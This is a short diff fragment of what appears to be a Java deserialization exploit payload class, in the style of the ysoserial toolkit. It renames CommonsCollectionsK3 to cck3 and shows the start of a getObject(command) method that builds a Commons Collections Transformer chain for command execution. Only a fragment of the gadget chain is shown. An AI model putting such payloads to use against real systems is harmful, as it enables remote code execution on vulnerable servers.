@@ -15,7 +15,7 @@ import java.util.Map;
 
 @Dependencies({"commons-collections:commons-collections:3.1"})
 @Authors({Authors.MATTHIASKAISER})
-public class CommonsCollectionsK3 implements ObjectPayload<Object> {
+public class cck3 implements ObjectPayload<Object> {
 
     public Object getObject(String command) throws Exception {
         Transformer[] fakeTransformers = new Transformer[]{new ConstantTransformer(1)};
